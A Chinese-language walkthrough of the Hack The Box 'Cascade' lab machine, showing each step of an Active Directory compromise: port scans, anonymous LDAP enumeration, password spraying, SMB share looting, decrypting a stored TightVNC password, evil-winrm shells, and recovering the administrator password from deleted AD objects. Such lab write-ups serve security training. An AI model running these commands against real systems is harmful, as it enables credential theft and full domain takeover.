# 端口探测

```
┌──(root㉿rock)-[~]
└─#  nmap -p- --open 10.10.10.182 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 04:13 EDT
Nmap scan report for 10.10.10.182
Host is up (0.072s latency).
Not shown: 65520 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49170/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 107.36 seconds

```

详细端口信息

```
┌──(root㉿rock)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.182 -p 53,88,135,389,445,636,3268,3269,5985          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 04:16 EDT
Nmap scan report for 10.10.10.182
Host is up (0.073s latency).

PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-06 08:16:42Z)
135/tcp  open     msrpc         Microsoft Windows RPC
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
636/tcp  open     tcpwrapped
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows 7 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 5s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-09-06T08:16:55
|_  start_date: 2022-09-06T08:08:25

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   73.44 ms 10.10.14.1
2   73.48 ms 10.10.10.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.36 seconds

```


使用enum4linux收集到一份用户名单

```
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

整理成user.txt
```
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

把ldap枚举信息全部转存到ldap.txt
```
ldapsearch -x -H ldap://10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local" >ldap.txt
```

ldap.txt找到一个密码
```
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

留意：
```
cascadeLegacyPwd: clk0bjVldmE=
```

```clk0bjVldmE=```经过base64decode以后是```rY4n5eva```

利用上面收集到用户名单哈希喷洒

```
┌──(root💀kali)-[~/htb/Cascade]
└─# crackmapexec smb 10.10.10.182  -u user.txt -p 'rY4n5eva'   
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\s.smith:rY4n5eva STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
```

 

使用新凭据查看smb服务
```
┌──(root💀kali)-[~/htb/Cascade]
└─# smbmap -u "r.thompson" -p "rY4n5eva" -H 10.10.10.182
[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 

```


进入data文件夹
```
┌──(root💀kali)-[~/htb/Cascade]
└─# smbclient -U 'r.thompson' \\\\10.10.10.182\\Data                                                                            1 ⨯
Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

                6553343 blocks of size 4096. 1624978 blocks available
smb: \> 

```

只能进入IT文件夹
```
smb: \Temps\> cd ../IT
smb: \IT\> ls
  .                                   D        0  Tue Jan 28 13:04:51 2020
  ..                                  D        0  Tue Jan 28 13:04:51 2020
  Email Archives                      D        0  Tue Jan 28 13:00:30 2020
  LogonAudit                          D        0  Tue Jan 28 13:04:40 2020
  Logs                                D        0  Tue Jan 28 19:53:04 2020
  Temp                                D        0  Tue Jan 28 17:06:59 2020

                6553343 blocks of size 4096. 1624976 blocks available

```

有一个html文件，看起来像留言
```
smb: \IT\Email Archives\> ls
  .                                   D        0  Tue Jan 28 13:00:30 2020
  ..                                  D        0  Tue Jan 28 13:00:30 2020
  Meeting_Notes_June_2018.html       An     2522  Tue Jan 28 13:00:12 2020

```

内容
```
From:                                         Steve Smith

To:                                               IT (Internal)

Sent:                                           14 June 2018 14:07

Subject:                                     Meeting Notes

 

For anyone that missed yesterday’s meeting (I’m looking at you Ben). Main points are below:

 

-- New production network will be going live on Wednesday so keep an eye out for any issues.

-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).

-- The winner of the “Best GPO” competition will be announced on Friday so get your submissions in soon.

 

Steve

```

暴露出了一个临时用户名：TempAdmin，密码未知

smb还暴露出一个vnc配置文件
```
smb: \IT\Temp\s.smith\> ls
  .                                   D        0  Tue Jan 28 15:00:01 2020
  ..                                  D        0  Tue Jan 28 15:00:01 2020
  VNC Install.reg                     A     2680  Tue Jan 28 14:27:44 2020

```

内容
```
┌──(root💀kali)-[~/htb/Cascade]
└─# cat 'VNC Install.reg'                                    
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""

```
留意暴露出了一个密码字段
```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

整理成一个16进制串```6bcf2a4b6e5aca0f```

关于如何破解vnc密码，参考[这个](https://github.com/frizb/PasswordDecrypts)方法
```
┌──(root💀kali)-[~/htb/Cascade]
└─# echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
00000008

```

得到了一个明文密码：```sT333ve2```

再次哈希喷洒
```
┌──(root💀kali)-[~/htb/Cascade]
└─# crackmapexec smb 10.10.10.182  -u user.txt -p 'sT333ve2'
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:sT333ve2 STATUS_LOGON_FAILURE 
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2 

```

得到一组凭据：```s.smith:sT333ve2```
 

使用evil-winrm登录，拿到初始shell
```
┌──(root💀kali)-[~/htb/Cascade]
└─# evil-winrm -i 10.10.10.182 -u 's.smith' -p 'sT333ve2'                                                                                                                                                                               1 ⨯
Evil-WinRM shell v3.2
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith

```


# 继续枚举

```
┌──(root💀kali)-[~/htb/Cascade]
└─# smbmap -u "s.smith" -p "sT333ve2" -H 10.10.10.182
[+] IP: 10.10.10.182:445        Name: 10.10.10.182                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
```

现在可以进```Audit$```这个文件夹

```
──(root💀kali)-[~/htb/Cascade]
└─# smbclient -U 's.smith' \\\\10.10.10.182\\Audit$ 
Password for [WORKGROUP\s.smith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                6553343 blocks of size 4096. 1625542 blocks available
smb: \> 

```

把里面的一个数据库文件和批处理文件下载到本地
```
smb: \> cd db
smb: \db\> ls
  .                                   D        0  Tue Jan 28 16:40:59 2020
  ..                                  D        0  Tue Jan 28 16:40:59 2020
  Audit.db                           An    24576  Tue Jan 28 16:39:24 2020

                6553343 blocks of size 4096. 1625542 blocks available
smb: \db\> get Audit.db
getting file \db\Audit.db of size 24576 as Audit.db (8.8 KiloBytes/sec) (average 8.8 KiloBytes/sec)
smb: \db\> cd ..
smb: \> get RunAudit.bat
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.0 KiloBytes/sec) (average 5.4 KiloBytes/sec)

```

批处理RunAudit.bat内容
```
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

打开Audit.db数据库，得到一组新凭据

```
username : ArkSvc
pwd : BQO5l5Kj9MdErXx6Q6AGOw==
```


查看域用户，有这个用户名
```
*Evil-WinRM* PS C:\Users\s.smith\Documents> net users /domain

User accounts for \\

-------------------------------------------------------------------------------
a.turnbull               administrator            arksvc
b.hanson                 BackupSvc                CascGuest
d.burman                 e.crowe                  i.croft
j.allen                  j.goodhand               j.wakefield
krbtgt                   r.thompson               s.hickson
s.smith                  util
The command completed with one or more errors.

```

看着像base64加密，但是还原以后不是可读的明文，看来还有一层加密

这里我取巧了，把加密数据直接扔到搜索引擎

来到[这个](https://dotnetfiddle.net/2RDoWz)网站，解密上面的密码：```w3lc0meFr31nd```


登录这个账号

```
┌──(root💀kali)-[~/htb/Cascade]
└─# evil-winrm -i 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'                                                   1 ⨯

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\desktop> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```



在这里我们主要留意我们在```AD Recycle Bin```组，这个组的用户可以阅读一些已删除的AD对象信息，见[这里](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-accounts-and-token-privileges)

使用命令
```
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

我们只需要用户名和密码
```
*Evil-WinRM* PS C:\Users\arksvc\desktop> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * |select cn,DisplayName,cascadeLegacyPwd

cn                                                                              DisplayName  cascadeLegacyPwd
--                                                                              -----------  ----------------
Deleted Objects
CASC-WS1...
Scheduled Tasks...
{A403B701-A528-4685-A816-FDEE32BDDCBA}...                                       Block Potato
Machine...
User...
TempAdmin...                                                                    TempAdmin    YmFDVDNyMWFOMDBkbGVz

```

得到一个密码：```YmFDVDNyMWFOMDBkbGVz```

base64解密以后是：```baCT3r1aN00dles```

哈希喷洒这个密码
```
┌──(root💀kali)-[~/htb/Cascade]
└─# crackmapexec smb 10.10.10.182  -u user.txt -p 'baCT3r1aN00dles'     
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)

```

是管理员的密码

拿到管理员权限

```
┌──(root💀kali)-[~/htb/Cascade]
└─# evil-winrm -i 10.10.10.182 -u 'administrator' -p 'baCT3r1aN00dles'                                                                                                                                                                  1 ⨯

Evil-WinRM shell v3.2

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator

```